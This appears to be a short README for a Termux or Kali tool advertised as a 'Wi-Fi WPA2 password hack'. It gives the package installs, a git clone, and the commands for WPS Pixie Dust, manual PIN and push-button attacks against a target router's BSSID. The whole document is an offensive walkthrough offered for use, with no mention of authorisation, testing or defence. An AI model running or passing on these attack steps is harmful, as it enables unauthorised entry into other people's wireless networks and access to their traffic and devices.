# Wi-Fi WPA2 PassWord HACK ONLY ROUTER

pkg install -y root-repo

pkg install -y git tsu python wpa-supplicant pixiewps iw openssl

# download only root user

apt-get install build-essential

apt-get install libpcap-dev

apt-get install sqlite3

apt-get install libsqlite3-dev

apt-get install pixiewps

# installing Tool ComMand
![Screenshot_2024-01-12-16-12-14-241_com termux](https://github.com/HeartHaNterAlex/wifi/assets/139457526/16b0b31a-3385-4fb7-ac7b-5046118c0b08)

pkg install git

pkg install python3


git clone https://github.com/HeartHaNterAlex/wifi


# only one command run


sudo python wifi/ps.py -i wlan1 -K
# kali command 
![Screenshot_2024-01-12-16-14-06-822_com termux](https://github.com/HeartHaNterAlex/wifi/assets/139457526/c6af3833-4b1f-4e86-b7e0-191f0ccac1b1)

sudo python wifi/kali-ps.py -i wlan1 -K

# select Host number press inter attack 

# manual pin attack 🧷

sudo python3 wifi/ps.py -i wlan0 -b d9:90:4C:C9:D0:A7 -B -p 1234
# 80% Wi-Fi hack
sudo python3 wifi/ps.py -i wlan0 --pbc
# help command
sudo python wifi/ps.py -i wlan1 -K -h
